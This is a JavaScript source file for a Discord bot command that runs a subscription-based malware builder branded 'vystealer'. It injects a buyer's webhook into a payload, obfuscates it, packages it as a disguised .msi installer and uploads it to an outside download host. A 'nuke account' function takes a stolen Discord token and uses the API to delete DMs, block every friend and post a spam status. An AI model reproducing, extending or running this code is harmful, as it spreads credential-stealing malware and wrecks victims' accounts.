const { SlashCommandBuilder, EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle, ModalBuilder, TextInputBuilder, TextInputStyle } = require('discord.js');
const fs = require('fs');
const path = require('path');
const { execFile, exec } = require('child_process');
const axios = require('axios');
const FormData = require('form-data');
const { MongoClient } = require('mongodb');
require('dotenv').config({ path: path.resolve(__dirname, '../.env') });

let buildQueue = [];
let isBuilding = false;

const client = new MongoClient(process.env.MONGODB_URI);
let keysCollection;

client.connect().then(() => {
    const db = client.db(process.env.MONGODB_DB_NAME);
    keysCollection = db.collection('keys');
}).catch(console.error);

module.exports = {
    data: new SlashCommandBuilder()
        .setName('panel')
        .setDescription('Build/config your executable within seconds'),
    async execute(interaction) {
        try {
            const userId = interaction.user.id;
            const userKey = await keysCollection.findOne({ userId });

            if (!userKey) {
                return interaction.reply({ content: 'You dont have a plan.', ephemeral: true });
            }

            const row = new ActionRowBuilder()
                .addComponents(
                    new ButtonBuilder()
                        .setCustomId('configure_exe')
                        .setLabel('Configure Exe')
                        .setStyle(ButtonStyle.Secondary),
                    new ButtonBuilder()
                        .setCustomId('configure_webhook')
                        .setLabel('Configure Webhook')
                        .setStyle(ButtonStyle.Secondary),
                    new ButtonBuilder()
                        .setCustomId('test_webhook')
                        .setLabel('Test Webhook')
                        .setStyle(ButtonStyle.Secondary),
                    new ButtonBuilder()
                        .setCustomId('nuke_account')
                        .setLabel('Nuke Account')
                        .setStyle(ButtonStyle.Secondary),
                    new ButtonBuilder()
                        .setCustomId('start_build')
                        .setLabel('Start Build')
                        .setStyle(ButtonStyle.Secondary)
                        .setEmoji("<a:loading_vy:1337521252520169524>"),
                );

            const embed = new EmbedBuilder()
                .setColor('#303037')
                .setAuthor({ name: `Build Panel`, iconURL: interaction.user.displayAvatarURL() })
                .setDescription('Please select one of the options below.')
                .addFields(
                    { name: '<:name:1337521410477654086> Name:', value: `\`${userKey.name || 'None'}\``, inline: false },
                    { name: '<:2891:1337528024882483220> Executable:', value: userKey.name && userKey.description ? '\`Activated\`' : '\`Deactivated\`', inline: false },
                    { name: '<:description:1337521347642921063> Plan Expires:', value: userKey.expirationDate ? `<t:${Math.floor(new Date(userKey.expirationDate).getTime() / 1000)}:R>` : 'None', inline: true },
                )
                .setFooter({ text: `${interaction.user.username} | @vystealer` })
                .setTimestamp();

            await interaction.reply({ embeds: [embed], components: [row], ephemeral: true });

            const filter = i => i.user.id === interaction.user.id;
            const collector = interaction.channel.createMessageComponentCollector({ filter });

            collector.on('collect', async i => {
                if (i.customId === 'configure_exe') {
                    const modal = new ModalBuilder()
                        .setCustomId('configure_exe_modal')
                        .setTitle('Configure Exe')
                        .addComponents(
                            new ActionRowBuilder().addComponents(
                                new TextInputBuilder()
                                    .setCustomId('name')
                                    .setLabel('Name')
                                    .setStyle(TextInputStyle.Short)
                                    .setRequired(true)
                            ),
                            new ActionRowBuilder().addComponents(
                                new TextInputBuilder()
                                    .setCustomId('description')
                                    .setLabel('Description')
                                    .setStyle(TextInputStyle.Paragraph)
                                    .setRequired(true)
                            )
                        );

                    await i.showModal(modal);
                } else if (i.customId === 'configure_webhook') {
                    const modal = new ModalBuilder()
                        .setCustomId('configure_webhook_modal')
                        .setTitle('Configure Webhook')
                        .addComponents(
                            new ActionRowBuilder().addComponents(
                                new TextInputBuilder()
                                    .setCustomId('webhook')
                                    .setLabel('Webhook URL')
                                    .setStyle(TextInputStyle.Short)
                                    .setRequired(true)
                            )
                        );

                    await i.showModal(modal);
                } else if (i.customId === 'test_webhook') {
                    const userKey = await keysCollection.findOne({ userId: i.user.id });
                    const webhook = userKey.webhook;
                    if (!webhook) {
                        await i.reply({ content: 'Webhook not configured.', ephemeral: true });
                        return;
                    }

                    try {
                        await axios.post(webhook, { content: 'uwu' });
                        await i.reply({ content: 'Webhook is valid and received the test message.', ephemeral: true });
                    } catch (error) {
                        await i.reply({ content: 'Webhook is invalid.', ephemeral: true });
                    }
                } else if (i.customId === 'start_build') {
                    await i.deferUpdate();
                    buildQueue.push({ interaction, userId });
                    if (!isBuilding) {
                        processQueue();
                    }
                } else if (i.customId === 'nuke_account') {
                    const modal = new ModalBuilder()
                        .setCustomId('nuke_account_modal')
                        .setTitle('Nuke Account')
                        .addComponents(
                            new ActionRowBuilder().addComponents(
                                new TextInputBuilder()
                                    .setCustomId('token')
                                    .setLabel('Account Token')
                                    .setStyle(TextInputStyle.Short)
                                    .setRequired(true)
                            )
                        );

                    await i.showModal(modal);
                }
            });

            interaction.client.on('interactionCreate', async modalInteraction => {
                if (!modalInteraction.isModalSubmit()) return;

                if (modalInteraction.customId === 'configure_exe_modal') {
                    const name = modalInteraction.fields.getTextInputValue('name');
                    const description = modalInteraction.fields.getTextInputValue('description');

                    await keysCollection.updateOne({ userId: modalInteraction.user.id }, { $set: { name, description } });
                    await modalInteraction.reply({ content: 'Executable configuration updated.', ephemeral: true });
                } else if (modalInteraction.customId === 'configure_webhook_modal') {
                    const webhook = modalInteraction.fields.getTextInputValue('webhook');

                    await keysCollection.updateOne({ userId: modalInteraction.user.id }, { $set: { webhook } });
                    await modalInteraction.reply({ content: 'Webhook configuration updated.', ephemeral: true });
                } else if (modalInteraction.customId === 'nuke_account_modal') {
                    const token = modalInteraction.fields.getTextInputValue('token');
                    await modalInteraction.reply({ content: 'Nuking account...', ephemeral: true });

                    try {
                        await nukeAccount(token);
                        await modalInteraction.followUp({ content: 'Account nuked successfully.', ephemeral: true });
                    } catch (error) {
                        console.error(error);
                        await modalInteraction.followUp({ content: 'Failed to nuke account.', ephemeral: true });
                    }
                }
            });
        } catch (error) {
            console.error(error);
            await interaction.reply({ content: 'An error occurred while processing your request.', ephemeral: true });
        }
    }
};

async function processQueue() {
    if (buildQueue.length === 0) {
        isBuilding = false;
        return;
    }

    isBuilding = true;
    const { interaction, userId } = buildQueue.shift();

    try {
        const userKey = await keysCollection.findOne({ userId });

        if (!userKey) {
            await interaction.editReply("User not found in the database.");
            processQueue();
            return;
        }

        const { name, description, webhook } = userKey;
        const payloaderDir = path.resolve(__dirname, '../build');
        const indexPath = path.join(payloaderDir, 'index.js');
        const packagePath = path.join(payloaderDir, 'package.json');
        const packageLockPath = path.join(payloaderDir, 'package-lock.json');

        let indexContent = fs.readFileSync(indexPath, 'utf8');
        indexContent = indexContent.replace('%WEBHOOK_URL%', webhook);
        fs.writeFileSync(indexPath, indexContent, 'utf8');

        let packageContent = fs.readFileSync(packagePath, 'utf8');
        packageContent = packageContent.replace(/%YOUR_NAME%/g, name);
        packageContent = packageContent.replace(/%YOUR_DESCRIPTION%/g, description);
        fs.writeFileSync(packagePath, packageContent, 'utf8');

        let packageLockContent = fs.readFileSync(packageLockPath, 'utf8');
        packageLockContent = packageLockContent.replace(/%YOUR_NAME%/g, name);
        packageLockContent = packageLockContent.replace(/%YOUR_DESCRIPTION%/g, description);
        fs.writeFileSync(packageLockPath, packageLockContent, 'utf8');

        await interaction.editReply({
            embeds: [
                new EmbedBuilder()
                    .setColor('#303037')
                    .setDescription("Executing the obfuscator... <a:loading_vy:1337521252520169524>")
                    .setFooter({ text: `${interaction.user.username} | @vystealer` })
                    .setTimestamp()
            ],
            components: [] 
        });

        const start = Date.now();

        execFile('node', ['obfuscator.js'], { cwd: payloaderDir }, async (error, stdout, stderr) => {
            if (error) {
                console.error(`Error: ${error.message}`);
                await interaction.editReply("An error occurred while obfuscating the project.");
                resetFiles(name, description, webhook);
                processQueue();
                return;
            }
            if (stderr) {
                console.error(`Stderr: ${stderr}`);
            }
            console.log(`Stdout: ${stdout}`);

            await interaction.editReply({
                embeds: [
                    new EmbedBuilder()
                        .setColor('#303037')
                        .setAuthor({ name: 'Vy | (1/3)', iconURL: 'https://i.imgur.com/tdv5Nvz.png' })
                        .setDescription("Obfuscating the file... <a:loading_vy:1337521252520169524>")
                        .setFooter({ text: `${interaction.user.username} | @vystealer` })
                        .setTimestamp()
                ]
            });

            exec('electron-builder', { cwd: payloaderDir }, async (error, stdout, stderr) => {
                if (error) {
                    console.error(`Error: ${error.message}`);
                    await interaction.editReply("An error occurred while building the project.");
                    resetFiles(name, description, webhook);
                    processQueue();
                    return;
                }
                if (stderr) {
                    console.error(`Stderr: ${stderr}`);
                }
                console.log(`Stdout: ${stdout}`);

                await interaction.editReply({
                    embeds: [
                        new EmbedBuilder()
                            .setColor('#303037')
                            .setAuthor({ name: 'Vy | (2/3)', iconURL: 'https://i.imgur.com/tdv5Nvz.png' })
                            .setDescription("Uploading to CDN... <a:loading_vy:1337521252520169524>")
                            .setFooter({ text: `${interaction.user.username} | @vystealer` })
                            .setTimestamp()
                    ]
                });

                resetFiles(name, description, webhook);

                const builtFilePath = path.join(payloaderDir, 'dist', `${name}.msi`);
                const fileSizeInBytes = fs.statSync(builtFilePath).size;
                const fileSizeInMB = (fileSizeInBytes / (1024 * 1024)).toFixed(2);

                const formData = new FormData();
                formData.append('file', fs.createReadStream(builtFilePath));

                try {
                    const response = await axios.post('https://luvcats.lat/send', formData, {
                        headers: formData.getHeaders()
                    });

                    if (response.data.message === 'ok') {
                        const end = Date.now();
                        const time = (end - start) / 1000;

                        const downloadUrl = `https://luvcats.lat/download/${name}.msi`;

                        const embed = new EmbedBuilder()
                            .setColor('#303037')
                            .setAuthor({ name: 'Vy | (3/3)', iconURL: 'https://i.imgur.com/tdv5Nvz.png' })
                            .setDescription(`Finished **building**.`)
                            .setFooter({ text: `${interaction.user.username} | Successfully built - @vystealer` });

                        const downloadButton = new ActionRowBuilder()
                            .addComponents(
                                new ButtonBuilder()
                                    .setLabel('Download')
                                    .setStyle(ButtonStyle.Link)
                                    .setURL(downloadUrl)
                            );

                        await interaction.editReply({ content: `Built in: ${time}s`, embeds: [embed], components: [downloadButton] });

                        fs.unlinkSync(builtFilePath);
                    } else {
                        console.log(response.data);
                        await interaction.editReply("An error occurred while uploading the file.");
                    }
                } catch (uploadError) {
                    console.error(uploadError);
                    await interaction.editReply("An error occurred while uploading the file.");
                }

                processQueue();
            });
        });
    } catch (error) {
        console.error(error);
        await interaction.editReply("An error occurred while processing your request.");
        processQueue();
    }
}

function resetFiles(name, description, webhook) {
    const payloaderDir = path.resolve(__dirname, '../build');
    const indexPath = path.join(payloaderDir, 'index.js');
    const packagePath = path.join(payloaderDir, 'package.json');
    const packageLockPath = path.join(payloaderDir, 'package-lock.json');

    let indexContent = fs.readFileSync(indexPath, 'utf8');
    indexContent = indexContent.replace(webhook, '%WEBHOOK_URL%');
    fs.writeFileSync(indexPath, indexContent, 'utf8');

    let packageContent = fs.readFileSync(packagePath, 'utf8');
    packageContent = packageContent.replace(new RegExp(name, 'g'), '%YOUR_NAME%');
    packageContent = packageContent.replace(new RegExp(description, 'g'), '%YOUR_DESCRIPTION%');
    fs.writeFileSync(packagePath, packageContent, 'utf8');

    let packageLockContent = fs.readFileSync(packageLockPath, 'utf8');
    packageLockContent = packageLockContent.replace(new RegExp(name, 'g'), '%YOUR_NAME%');
    packageLockContent = packageLockContent.replace(new RegExp(description, 'g'), '%YOUR_DESCRIPTION%');
    fs.writeFileSync(packageLockPath, packageLockContent, 'utf8');
}

async function nukeAccount(token) {
    const headers = { Authorization: token };

    const dms = await axios.get('https://discord.com/api/v9/users/@me/channels', { headers });
    for (const dm of dms.data) {
        await axios.delete(`https://discord.com/api/v9/channels/${dm.id}`, { headers });
    }

    const friends = await axios.get('https://discord.com/api/v9/users/@me/relationships', { headers });
    for (const friend of friends.data) {
        await axios.put(`https://discord.com/api/v9/users/@me/relationships/${friend.id}`, { type: 2 }, { headers });
    }

    await axios.patch('https://discord.com/api/v9/users/@me/settings', { custom_status: { text: 'discord.gg/vygang' } }, { headers });
}
